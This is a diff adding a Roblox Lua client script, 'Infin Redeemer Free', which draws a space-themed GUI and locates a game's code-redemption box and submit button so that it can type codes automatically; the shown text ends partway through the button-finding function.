@@ -1,0 +1,1241 @@
+local Players           = game:GetService("Players")
+local UserInputService  = game:GetService("UserInputService")
+local RunService        = game:GetService("RunService")
+local TweenService      = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui        = game:GetService("StarterGui")
+local Debris            = game:GetService("Debris")
+
+local player    = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+local camera    = workspace.CurrentCamera
+
+local LOGO_ID   = "rbxassetid://88206773600496"
+local KEY_SOUND = "rbxasset://sounds/clickfast.wav"
+
+-- only load in games with a code box
+do
+    local function hasBox(root)
+        if not root then return false end
+        local codes = root:FindFirstChild("Codes")
+        if codes and codes:FindFirstChildWhichIsA("TextBox", true) then return true end
+        for _, g in ipairs(root:GetChildren()) do
+            if g:IsA("ScreenGui") and not g.Name:find("INFIN", 1, true) then
+                for _, d in ipairs(g:GetDescendants()) do
+                    if d:IsA("TextBox") then
+                        local n = (d.Name .. (d.Parent and d.Parent.Name or "") .. g.Name):lower()
+                        if n:find("code", 1, true) or n:find("redeem", 1, true) then return true end
+                    end
+                end
+            end
+        end
+        return false
+    end
+    local found, deadline = false, os.clock() + 8
+    repeat
+        found = hasBox(PlayerGui) or hasBox(StarterGui)
+        if not found then task.wait(0.25) end
+    until found or os.clock() > deadline
+    if not found then
+        warn("[Infin Redeemer Free] No code box in this game - not loading.")
+        pcall(function()
+            StarterGui:SetCore("SendNotification", { Title = "Infin Redeemer Free", Text = "No code box in this game.", Duration = 5 })
+        end)
+        return
+    end
+end
+
+do
+    local old = PlayerGui:FindFirstChild("INFIN_FREE")
+    if old then old:Destroy() end
+end
+
+-- helpers
+local function new(class, props, kids)
+    local o = Instance.new(class)
+    local parent
+    for k, v in pairs(props or {}) do
+        if k == "Parent" then parent = v else o[k] = v end
+    end
+    for _, k in ipairs(kids or {}) do k.Parent = o end
+    if parent then o.Parent = parent end
+    return o
+end
+local function corner(o, r) new("UICorner", { CornerRadius = UDim.new(0, r), Parent = o }) return o end
+local function round(o) new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = o }) return o end
+local function stroke(o, c, t, tr)
+    return new("UIStroke", { Color = c, Thickness = t or 1, Transparency = tr or 0,
+        ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = o })
+end
+local function tween(o, t, props, style, dir)
+    local tw = TweenService:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), props)
+    tw:Play()
+    return tw
+end
+local rgb = Color3.fromRGB
+
+local C = {
+    black  = rgb(4, 4, 8),
+    panel  = rgb(24, 22, 42),
+    line   = rgb(84, 76, 128),
+    violet = rgb(120, 96, 245),
+    blue   = rgb(56, 120, 246),
+    accent = rgb(184, 160, 255),
+    white  = rgb(255, 255, 255),
+    muted  = rgb(210, 204, 230),
+    dim    = rgb(140, 134, 165),
+    green  = rgb(64, 224, 128),
+    yellow = rgb(246, 206, 76),
+    red    = rgb(235, 64, 64),
+}
+local GOTHAM_B, GOTHAM_M, GOTHAM_K = Enum.Font.GothamBold, Enum.Font.GothamMedium, Enum.Font.GothamBlack
+
+-- planet themes (the Themes tab shows all of them)
+local THEMES = {
+    { key = "mercury", name = "Mercury", c1 = rgb(196, 182, 168), c2 = rgb(116,  98,  84), accent = rgb(230, 214, 196), f1 = rgb(176, 162, 150), f2 = rgb( 92,  82,  74) },
+    { key = "venus",   name = "Venus",   c1 = rgb(244, 192, 118), c2 = rgb(192, 112,  52), accent = rgb(255, 224, 170), f1 = rgb(230, 180, 112), f2 = rgb(152,  92,  44) },
+    { key = "earth",   name = "Earth",   c1 = rgb( 70, 170, 255), c2 = rgb( 60, 210, 150), accent = rgb(150, 224, 236), f1 = rgb( 58, 142, 232), f2 = rgb( 40, 152,  96) },
+    { key = "mars",    name = "Mars",    c1 = rgb(240, 112,  70), c2 = rgb(150,  44,  30), accent = rgb(255, 172, 132), f1 = rgb(212,  92,  56), f2 = rgb(122,  40,  28) },
+    { key = "jupiter", name = "Jupiter", c1 = rgb(236, 186, 140), c2 = rgb(176,  96,  60), accent = rgb(255, 214, 172), f1 = rgb(214, 170, 126), f2 = rgb(150,  90,  58) },
+    { key = "saturn",  name = "Saturn",  c1 = rgb(240, 214, 150), c2 = rgb(180, 140,  70), accent = rgb(255, 232, 182), f1 = rgb(226, 200, 140), f2 = rgb(160, 120,  64) },
+    { key = "uranus",  name = "Uranus",  c1 = rgb(140, 230, 236), c2 = rgb( 70, 160, 202), accent = rgb(190, 240, 246), f1 = rgb(150, 226, 230), f2 = rgb( 90, 172, 198) },
+    { key = "neptune", name = "Neptune", c1 = rgb(120,  96, 245), c2 = rgb( 56, 120, 246), accent = rgb(184, 160, 255), f1 = rgb( 92,  72, 212), f2 = rgb( 40,  72, 182) },
+    { key = "pluto",   name = "Pluto",   c1 = rgb(198, 182, 202), c2 = rgb(112,  98, 122), accent = rgb(222, 208, 230), f1 = rgb(178, 162, 182), f2 = rgb( 98,  86, 106) },
+}
+local DEFAULT_THEME = THEMES[8]   -- Neptune: INFIN's violet + blue
+
+local function label(parent, props)
+    local base = { BackgroundTransparency = 1, Font = GOTHAM_M, TextSize = 11, TextColor3 = C.white,
+        TextXAlignment = Enum.TextXAlignment.Left, Parent = parent }
+    for k, v in pairs(props) do base[k] = v end
+    return new("TextLabel", base)
+end
+local function press(btn)
+    local sc = btn:FindFirstChildOfClass("UIScale") or new("UIScale", { Parent = btn })
+    btn.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            tween(sc, 0.08, { Scale = 0.93 }, Enum.EasingStyle.Quad)
+        end
+    end)
+    btn.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            tween(sc, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
+        end
+    end)
+end
+
+-- things that recolor when the theme changes
+local themedGrads, themedAccents = {}, {}
+local function regGrad(g) themedGrads[#themedGrads + 1] = g; return g end
+local function regAccent(obj, prop) themedAccents[#themedAccents + 1] = { obj = obj, prop = prop } end
+
+-- window
+local gui = new("ScreenGui", { Name = "INFIN_FREE", ResetOnSpawn = false, IgnoreGuiInset = true,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, DisplayOrder = 99, Parent = PlayerGui })
+
+local WIN      = 360
+local HEAD_H   = 46
+local STAT_Y   = 48
+local TAB_Y    = 80
+local PAGE_Y   = 130
+local PAGE_H   = 202
+local FULL_H   = 340
+local MINI_H   = 84
+
+local holder = new("Frame", { AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+    Size = UDim2.fromOffset(WIN, FULL_H), BackgroundTransparency = 1, Parent = gui })
+local fit = new("UIScale", { Parent = holder })
+local function refit()
+    local vp = camera.ViewportSize
+    fit.Scale = math.clamp(math.min(vp.Y * 0.84 / (FULL_H + 60), vp.X * 0.94 / WIN), 0.55, 1.2)
+end
+refit()
+camera:GetPropertyChangedSignal("ViewportSize"):Connect(refit)
+
+local card = new("Frame", { Size = UDim2.new(1, 0, 0, FULL_H), BackgroundColor3 = C.black, BorderSizePixel = 0,
+    ClipsDescendants = true, Parent = holder })
+corner(card, 18)
+local cardEdge = stroke(card, C.white, 1.4, 0.15)
+local edgeGrad = new("UIGradient", { Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, C.violet), ColorSequenceKeypoint.new(0.5, rgb(30, 26, 54)),
+    ColorSequenceKeypoint.new(1, C.blue) }), Parent = cardEdge })
+local popScale = new("UIScale", { Scale = 0.6, Parent = card })
+
+-- space background
+local space = new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.black, BorderSizePixel = 0, ZIndex = 0,
+    ClipsDescendants = true, Parent = card })
+corner(space, 18)
+new("UIGradient", { Color = ColorSequence.new(rgb(10, 6, 22), rgb(2, 2, 6)), Rotation = 120, Parent = space })
+local function nebula(col, size, pos, tr)
+    local n = new("Frame", { Size = UDim2.fromOffset(size, size), AnchorPoint = Vector2.new(0.5, 0.5), Position = pos,
+        BackgroundColor3 = col, BorderSizePixel = 0, ZIndex = 0, Parent = space })
+    round(n)
+    new("UIGradient", { Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, tr),
+        NumberSequenceKeypoint.new(0.6, 0.95), NumberSequenceKeypoint.new(1, 1) }), Parent = n })
+    return n
+end
+local neb1 = nebula(C.violet, 320, UDim2.fromScale(0.15, 0.2), 0.78)
+local neb2 = nebula(C.blue, 280, UDim2.fromScale(0.9, 0.9), 0.8)
+local loopInfo = TweenInfo.new(9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+TweenService:Create(neb1, loopInfo, { Position = UDim2.fromScale(0.3, 0.35), Size = UDim2.fromOffset(360, 360) }):Play()
+TweenService:Create(neb2, loopInfo, { Position = UDim2.fromScale(0.78, 0.72), Size = UDim2.fromOffset(320, 320) }):Play()
+
+-- a drifting ringed planet in the corner
+local bgPlanet = new("Frame", { Size = UDim2.fromOffset(30, 30), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.86, 0.12),
+    BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 0, Parent = space })
+round(bgPlanet)
+local planetGrad = new("UIGradient", { Color = ColorSequence.new(DEFAULT_THEME.f1, DEFAULT_THEME.f2), Rotation = 45, Parent = bgPlanet })
+local bgRing = new("Frame", { Size = UDim2.fromOffset(48, 10), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+    Rotation = -18, BackgroundTransparency = 1, ZIndex = 0, Parent = bgPlanet })
+round(bgRing)
+regAccent(stroke(bgRing, C.accent, 1.5, 0.35), "Color")
+TweenService:Create(bgPlanet, TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+    { Position = UDim2.fromScale(0.86, 0.105) }):Play()
+
+local SRNG = Random.new()
+local stars = {}
+for _, cfg in ipairs({ { n = 40, size = 1, speed = 3, alpha = 0.55 }, { n = 24, size = 2, speed = 7, alpha = 0.35 }, { n = 12, size = 3, speed = 13, alpha = 0.15 } }) do
+    for _ = 1, cfg.n do
+        local f = new("Frame", { Size = UDim2.fromOffset(cfg.size, cfg.size), AnchorPoint = Vector2.new(0.5, 0.5),
+            BackgroundColor3 = (SRNG:NextNumber() < 0.3) and C.accent or C.white, BorderSizePixel = 0, ZIndex = 0, Parent = space })
+        round(f)
+        stars[#stars + 1] = { f = f, x = SRNG:NextNumber(0, WIN), y = SRNG:NextNumber(0, FULL_H), v = cfg.speed,
+            base = cfg.alpha, ph = SRNG:NextNumber(0, 6.28), tw = SRNG:NextNumber(0.6, 2.2) }
+    end
+end
+local shooters = {}
+for i = 1, 2 do
+    local s = new("Frame", { Size = UDim2.fromOffset(64, 2), AnchorPoint = Vector2.new(1, 0.5), Rotation = 28,
+        BackgroundColor3 = C.white, BorderSizePixel = 0, Visible = false, ZIndex = 0, Parent = space })
+    round(s)
+    new("UIGradient", { Color = ColorSequence.new(C.accent, C.white), Transparency = NumberSequence.new(1, 0), Parent = s })
+    shooters[i] = { f = s, life = 0, next = 2 + i * 3, x = 0, y = 0 }
+end
+
+-- falling petals (Settings -> Petals)
+local petals, petalsOn = {}, false
+for i = 1, 22 do
+    local sz = SRNG:NextInteger(5, 9)
+    local f = new("Frame", { Size = UDim2.fromOffset(sz, math.floor(sz * 0.7)), AnchorPoint = Vector2.new(0.5, 0.5),
+        BackgroundColor3 = (i % 3 == 0) and C.accent or rgb(255, 206, 226), BackgroundTransparency = 0.25,
+        BorderSizePixel = 0, Visible = false, ZIndex = 0, Parent = space })
+    round(f)
+    petals[i] = { f = f, x = SRNG:NextNumber(0, WIN), y = SRNG:NextNumber(0, FULL_H), v = SRNG:NextNumber(16, 34),
+        sw = SRNG:NextNumber(10, 26), ph = SRNG:NextNumber(0, 6.28), spin = SRNG:NextNumber(-80, 80), rot = 0 }
+end
+
+-- header
+local head = new("Frame", { Size = UDim2.new(1, 0, 0, HEAD_H), BackgroundTransparency = 1, ZIndex = 3, Parent = card })
+do
+    local logo = new("ImageLabel", { Size = UDim2.fromOffset(30, 30), Position = UDim2.fromOffset(12, 8), Image = LOGO_ID,
+        ScaleType = Enum.ScaleType.Crop, BackgroundColor3 = C.panel, BorderSizePixel = 0, ZIndex = 3, Parent = head })
+    round(logo)
+    regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Parent = stroke(logo, C.white, 1.5, 0) }))
+    label(head, { Text = "Infin Redeemer", Font = GOTHAM_K, TextSize = 15, Position = UDim2.fromOffset(50, 8),
+        Size = UDim2.fromOffset(140, 18), ZIndex = 3 })
+    local badge = new("Frame", { Position = UDim2.fromOffset(176, 10), Size = UDim2.fromOffset(40, 16), BackgroundColor3 = C.white,
+        BorderSizePixel = 0, ZIndex = 3, Parent = head })
+    round(badge)
+    regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Parent = badge }))
+    label(badge, { Text = "FREE", Font = GOTHAM_K, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Center,
+        Size = UDim2.fromScale(1, 1), ZIndex = 4 })
+    label(head, { Text = "solar system  ·  .gg/infinhub", Font = GOTHAM_M, TextSize = 9, TextColor3 = C.dim,
+        Position = UDim2.fromOffset(50, 27), Size = UDim2.fromOffset(220, 12), ZIndex = 3 })
+end
+local minBtn = new("TextButton", { Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(28, 28),
+    AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -10, 0, 9), BackgroundColor3 = C.panel,
+    BorderSizePixel = 0, ZIndex = 3, Parent = head })
+corner(minBtn, 10)
+stroke(minBtn, C.line, 1, 0)
+local minBar = new("Frame", { Size = UDim2.fromOffset(12, 2), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+    BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 4, Parent = minBtn })
+round(minBar)
+local minPlus = new("Frame", { Size = UDim2.fromOffset(2, 12), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+    BackgroundColor3 = C.white, BorderSizePixel = 0, Visible = false, ZIndex = 4, Parent = minBtn })
+round(minPlus)
+press(minBtn)
+
+-- status bar (always visible)
+local statusBar = new("Frame", { Size = UDim2.new(1, -24, 0, 26), Position = UDim2.fromOffset(12, STAT_Y),
+    BackgroundColor3 = C.panel, BackgroundTransparency = 0.05, BorderSizePixel = 0, ZIndex = 3, Parent = card })
+corner(statusBar, 12)
+stroke(statusBar, C.line, 1, 0)
+local statusDot = new("Frame", { Size = UDim2.fromOffset(8, 8), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 10, 0.5, 0),
+    BackgroundColor3 = C.red, BorderSizePixel = 0, ZIndex = 4, Parent = statusBar })
+round(statusDot)
+local statusHalo = new("Frame", { Size = UDim2.fromOffset(8, 8), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0, 14, 0.5, 0),
+    BackgroundColor3 = C.yellow, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3, Parent = statusBar })
+round(statusHalo)
+local statusText = label(statusBar, { Text = "idle", Font = GOTHAM_B, TextSize = 11, TextColor3 = C.red,
+    TextTruncate = Enum.TextTruncate.AtEnd, Position = UDim2.fromOffset(26, 0), Size = UDim2.new(1, -36, 1, 0), ZIndex = 4 })
+local function setStatus(text, color)
+    statusText.Text = text
+    statusText.TextColor3 = color
+    statusDot.BackgroundColor3 = color
+    statusText.Position = UDim2.fromOffset(32, 0)
+    tween(statusText, 0.25, { Position = UDim2.fromOffset(26, 0) })
+end
+
+-- tab orbit: planets are the tabs
+local pagesHolder = new("Frame", { Size = UDim2.new(1, 0, 0, PAGE_H), Position = UDim2.fromOffset(0, PAGE_Y),
+    BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 3, Parent = card })
+local tabBar = new("Frame", { Size = UDim2.new(1, -24, 0, 46), Position = UDim2.fromOffset(12, TAB_Y),
+    BackgroundTransparency = 1, ZIndex = 3, Parent = card })
+local orbit = new("Frame", { Size = UDim2.new(1, -20, 0, 2), Position = UDim2.new(0, 10, 0, 16), BackgroundColor3 = C.line,
+    BackgroundTransparency = 0.3, BorderSizePixel = 0, ZIndex = 3, Parent = tabBar })
+round(orbit)
+new("UIGradient", { Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 1),
+    NumberSequenceKeypoint.new(0.5, 0.2), NumberSequenceKeypoint.new(1, 1) }), Parent = orbit })
+
+local TABS = {
+    { key = "redeem",   name = "Redeem",   f1 = rgb(60, 142, 232), f2 = rgb(40, 152, 96),  ring = false },
+    { key = "themes",   name = "Themes",   f1 = rgb(226, 200, 140), f2 = rgb(160, 120, 64), ring = true  },
+    { key = "settings", name = "Settings", f1 = rgb(176, 162, 150), f2 = rgb(92, 82, 74),   ring = false },
+    { key = "test",     name = "Test",     f1 = rgb(212, 92, 56),  f2 = rgb(122, 40, 28),  ring = false },
+}
+local pages, tabNodes, current = {}, {}, nil
+local function makePage(key, scrolling)
+    local pg
+    if scrolling then
+        pg = new("ScrollingFrame", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, BorderSizePixel = 0,
+            CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, ScrollBarThickness = 2,
+            ScrollBarImageColor3 = C.violet, Visible = false, ZIndex = 3, Parent = pagesHolder })
+    else
+        pg = new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Visible = false, ZIndex = 3, Parent = pagesHolder })
+    end
+    pages[key] = pg
+    return pg
+end
+local function styleTabs()
+    for _, t in ipairs(tabNodes) do
+        local on = t.key == current
+        tween(t.planet, 0.25, { Size = UDim2.fromOffset(on and 30 or 24, on and 30 or 24) }, Enum.EasingStyle.Back)
+        t.ringStroke.Transparency = on and 0 or 1
+        t.ringStroke.Color = C.accent
+        tween(t.label, 0.2, { TextColor3 = on and C.white or C.dim })
+        t.glow.BackgroundTransparency = on and 0.75 or 1
+    end
+end
+local function showPage(key)
+    if current == key then return end
+    local old = current and pages[current]
+    current = key
+    styleTabs()
+    if old then old.Visible = false end
+    local pg = pages[key]
+    pg.Visible = true
+    pg.Position = UDim2.fromOffset(0, 12)
+    tween(pg, 0.28, { Position = UDim2.fromOffset(0, 0) })
+end
+for i, t in ipairs(TABS) do
+    local cx = (i - 0.5) / #TABS
+    local node = new("TextButton", { Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(60, 46),
+        AnchorPoint = Vector2.new(0.5, 0), Position = UDim2.new(cx, 0, 0, 0), BackgroundTransparency = 1, ZIndex = 4, Parent = tabBar })
+    local glow = new("Frame", { Size = UDim2.fromOffset(34, 34), AnchorPoint = Vector2.new(0.5, 0), Position = UDim2.new(0.5, 0, 0, 0),
+        BackgroundColor3 = C.accent, BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 3, Parent = node })
+    round(glow)
+    local planet = new("Frame", { Size = UDim2.fromOffset(24, 24), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0, 16),
+        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 4, Parent = node })
+    round(planet)
+    new("UIGradient", { Color = ColorSequence.new(t.f1, t.f2), Rotation = 55, Parent = planet })
+    local ringStroke = stroke(planet, C.accent, 1.6, 1)
+    if t.ring then   -- Saturn gets a little ring
+        local pr = new("Frame", { Size = UDim2.fromOffset(34, 8), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+            Rotation = -20, BackgroundTransparency = 1, ZIndex = 4, Parent = planet })
+        round(pr)
+        stroke(pr, rgb(255, 232, 182), 1.4, 0.2)
+    end
+    local lbl = label(node, { Text = t.name, Font = GOTHAM_B, TextSize = 9, TextColor3 = C.dim,
+        TextXAlignment = Enum.TextXAlignment.Center, AnchorPoint = Vector2.new(0.5, 1), Position = UDim2.new(0.5, 0, 1, 0),
+        Size = UDim2.fromOffset(60, 12), ZIndex = 4 })
+    press(node)
+    node.MouseButton1Click:Connect(function() showPage(t.key) end)
+    tabNodes[i] = { key = t.key, planet = planet, label = lbl, ringStroke = ringStroke, glow = glow }
+end
+
+-- ============ REDEEM PAGE ============
+local pRedeem = makePage("redeem")
+local codeBox = new("Frame", { Size = UDim2.new(1, -24, 0, 66), Position = UDim2.fromOffset(12, 4),
+    BackgroundColor3 = rgb(14, 12, 26), BorderSizePixel = 0, ClipsDescendants = true, ZIndex = 3, Parent = pRedeem })
+corner(codeBox, 16)
+local codeEdge = stroke(codeBox, C.line, 1.4, 0.1)
+local codeEdgeGrad = regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Enabled = false, Parent = codeEdge }))
+local sweep = new("Frame", { Size = UDim2.new(0.4, 0, 1, 0), Position = UDim2.new(-0.4, 0, 0, 0), BackgroundColor3 = C.violet,
+    BorderSizePixel = 0, Visible = false, ZIndex = 3, Parent = codeBox })
+corner(sweep, 14)
+new("UIGradient", { Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 1),
+    NumberSequenceKeypoint.new(0.5, 0.82), NumberSequenceKeypoint.new(1, 1) }), Parent = sweep })
+local dots = {}
+for i = 1, 3 do
+    local d = new("Frame", { Size = UDim2.fromOffset(9, 9), AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, (i - 2) * 18, 0.5, 0), BackgroundColor3 = C.muted, BorderSizePixel = 0, ZIndex = 4, Parent = codeBox })
+    round(d)
+    dots[i] = d
+end
+local codeText = label(codeBox, { Text = "", Font = GOTHAM_K, TextSize = 22, TextXAlignment = Enum.TextXAlignment.Center,
+    TextTruncate = Enum.TextTruncate.AtEnd, Size = UDim2.new(1, -24, 1, 0), Position = UDim2.fromOffset(12, 0), ZIndex = 4 })
+local codeTextGrad = new("UIGradient", { Color = ColorSequence.new(C.white, rgb(205, 185, 255)), Rotation = 90, Parent = codeText })
+local caret = new("Frame", { Size = UDim2.fromOffset(2, 24), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0),
+    BackgroundColor3 = C.accent, BorderSizePixel = 0, Visible = false, ZIndex = 5, Parent = codeBox })
+regAccent(caret, "BackgroundColor3")
+local wordHint = label(codeBox, { Text = "", Font = GOTHAM_B, TextSize = 9, TextColor3 = C.dim,
+    TextXAlignment = Enum.TextXAlignment.Center, AnchorPoint = Vector2.new(0.5, 1), Position = UDim2.new(0.5, 0, 1, -5),
+    Size = UDim2.new(1, -20, 0, 11), ZIndex = 4 })
+
+local wordsRow = new("Frame", { Size = UDim2.new(1, -24, 0, 28), Position = UDim2.fromOffset(12, 76), BackgroundTransparency = 1,
+    ZIndex = 3, Parent = pRedeem })
+label(wordsRow, { Text = "WORDS", Font = GOTHAM_K, TextSize = 10, TextColor3 = C.accent, Size = UDim2.new(0, 60, 1, 0), ZIndex = 3 })
+local seg = new("Frame", { AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, 0, 0.5, 0), Size = UDim2.fromOffset(6 * 34 + 6, 28),
+    BackgroundColor3 = C.panel, BorderSizePixel = 0, ZIndex = 3, Parent = wordsRow })
+corner(seg, 12)
+stroke(seg, C.line, 1, 0)
+local pill = new("Frame", { Size = UDim2.fromOffset(34, 22), Position = UDim2.fromOffset(3 + 2 * 34, 3), BackgroundColor3 = C.white,
+    BorderSizePixel = 0, ZIndex = 3, Parent = seg })
+corner(pill, 10)
+regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Parent = pill }))
+local pillScale = new("UIScale", { Parent = pill })
+local wordBtns = {}
+
+local grid = new("Frame", { Size = UDim2.new(1, -24, 0, 76), Position = UDim2.fromOffset(12, 118), BackgroundTransparency = 1,
+    ZIndex = 3, Parent = pRedeem })
+new("UIGridLayout", { CellSize = UDim2.new(0.5, -4, 0, 34), CellPadding = UDim2.fromOffset(8, 8),
+    SortOrder = Enum.SortOrder.LayoutOrder, Parent = grid })
+
+local function chip(parent, order, text, isToggle, initial, onChange)
+    local b = new("TextButton", { Text = "", AutoButtonColor = false, BackgroundColor3 = C.panel,
+        BorderSizePixel = 0, LayoutOrder = order, ZIndex = 3, Parent = parent })
+    corner(b, 12)
+    local e = stroke(b, C.line, 1.2, 0)
+    local fill = regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Enabled = false, Parent = b }))
+    local ind = new("Frame", { Size = UDim2.fromOffset(8, 8), AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 11, 0.5, 0),
+        BackgroundColor3 = C.dim, BorderSizePixel = 0, ZIndex = 4, Parent = b })
+    round(ind)
+    if not isToggle then ind.BackgroundColor3 = C.accent end
+    local t = label(b, { Text = text, Font = GOTHAM_B, TextSize = 11, TextColor3 = C.muted, Position = UDim2.fromOffset(26, 0),
+        Size = UDim2.new(1, -30, 1, 0), ZIndex = 4 })
+    press(b)
+    local state = initial and true or false
+    local function paint(v)
+        fill.Enabled = v
+        b.BackgroundColor3 = v and C.white or C.panel
+        tween(t, 0.18, { TextColor3 = v and C.white or C.muted })
+        tween(ind, 0.25, { BackgroundColor3 = v and C.white or C.dim, Size = v and UDim2.fromOffset(10, 10) or UDim2.fromOffset(8, 8) },
+            Enum.EasingStyle.Back)
+        e.Color = v and C.accent or C.line
+        e.Transparency = v and 0.4 or 0
+    end
+    if isToggle then paint(state) end
+    local api = {}
+    function api.set(v, silent)
+        state = v
+        paint(v)
+        if onChange and not silent then onChange(v) end
+    end
+    function api.get() return state end
+    b.MouseButton1Click:Connect(function()
+        if isToggle then
+            api.set(not state)
+        else
+            local g = new("Frame", { Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.violet, BackgroundTransparency = 0.5,
+                BorderSizePixel = 0, ZIndex = 3, Parent = b })
+            corner(g, 12)
+            tween(g, 0.4, { BackgroundTransparency = 1 })
+            Debris:AddItem(g, 0.45)
+            if onChange then onChange() end
+        end
+    end)
+    return api
+end
+
+-- state
+local S = {
+    listening = false, autoListen = false, twoWord = false, ignoreSystem = true, sound = true,
+    words = 3, buffer = {}, typing = false, lastWords = {},
+    detectDelay = 0.05, typeDelay = 0.06, submitDelay = 0.05,
+    listenKey = Enum.KeyCode.F, theme = DEFAULT_THEME.key,
+}
+
+local function refreshIdle()
+    if S.listening then
+        setStatus(("listening  ·  %d/%d"):format(#S.buffer, S.words), C.yellow)
+    else
+        setStatus(UserInputService.KeyboardEnabled and "idle  ·  press listen key or tap Listen" or "idle  ·  tap Listen", C.red)
+    end
+    wordHint.Text = S.listening and ("%d / %d words"):format(#S.buffer, S.words) or ""
+end
+
+local function selectWords(n, fromCode)
+    n = math.clamp(n, 1, 6)
+    S.words = n
+    tween(pill, 0.38, { Position = UDim2.fromOffset(3 + (n - 1) * 34, 3) }, Enum.EasingStyle.Back)
+    pillScale.Scale = 0.8
+    tween(pillScale, 0.35, { Scale = 1 }, Enum.EasingStyle.Back)
+    for i, b in ipairs(wordBtns) do tween(b, 0.2, { TextColor3 = (i == n) and C.white or C.muted }) end
+    if fromCode then
+        local lbl = wordsRow:FindFirstChildOfClass("TextLabel")
+        if lbl then
+            lbl.TextColor3 = C.green
+            tween(lbl, 1.2, { TextColor3 = C.accent })
+        end
+    end
+    refreshIdle()
+end
+for i = 1, 6 do
+    local b = new("TextButton", { Text = tostring(i), Font = GOTHAM_K, TextSize = 12, TextColor3 = (i == 3) and C.white or C.muted,
+        AutoButtonColor = false, BackgroundTransparency = 1, Size = UDim2.fromOffset(34, 28), Position = UDim2.fromOffset(3 + (i - 1) * 34, 0),
+        ZIndex = 4, Parent = seg })
+    b.MouseButton1Click:Connect(function() selectWords(i) end)
+    wordBtns[i] = b
+end
+
+local function showCode(text)
+    codeText.Text = text or ""
+    local has = text and text ~= ""
+    for _, d in ipairs(dots) do d.Visible = not has end
+    caret.Visible = has and S.typing
+end
+
+-- keyboard click per letter
+local keyPool, keyIdx = {}, 0
+for i = 1, 5 do keyPool[i] = new("Sound", { SoundId = KEY_SOUND, Volume = 0.45, Parent = gui }) end
+local function keyClick()
+    keyIdx = keyIdx % #keyPool + 1
+    local s = keyPool[keyIdx]
+    s.PlaybackSpeed = SRNG:NextNumber(1.05, 1.45)
+    s.TimePosition = 0
+    s:Play()
+end
+
+-- ===== the game's code box + submit (engine) =====
+local R = {}
+function R.findBox()
+    local codes = PlayerGui:FindFirstChild("Codes")
+    if codes then
+        local main = (codes:FindFirstChild("Codes") or codes):FindFirstChild("Main")
+        local tb = main and main:FindFirstChild("TextBox")
+        if tb and tb:IsA("TextBox") then return tb end
+        local any = codes:FindFirstChildWhichIsA("TextBox", true)
+        if any then return any end
+    end
+    for _, g in ipairs(PlayerGui:GetChildren()) do
+        if g:IsA("ScreenGui") and g ~= gui and not g.Name:find("INFIN", 1, true) then
+            for _, d in ipairs(g:GetDescendants()) do
+                if d:IsA("TextBox") then
+                    local n = (d.Name .. (d.Parent and d.Parent.Name or "")):lower()
+                    if n:find("code", 1, true) or n:find("redeem", 1, true) then return d end
+                end
+            end
+        end
+    end
+    return nil
+end
+function R.findButton(box)
+    local p = box and box.Parent
+    for _ = 1, 4 do
+        if not p then break end
+        for _, d in ipairs(p:GetDescendants()) do
+            if d:IsA("GuiButton") then
+                local n = d.Name:lower()
+                local t = d:IsA("TextButton") and d.Text:lower() or ""
+                if n:find("confirm") or n:find("submit") or n:find("redeem") or n:find("enter") or n:find("claim")
+                or t:find("redeem") or t:find("confirm") or t:find("submit") then
+                    return d
+                end
+            end
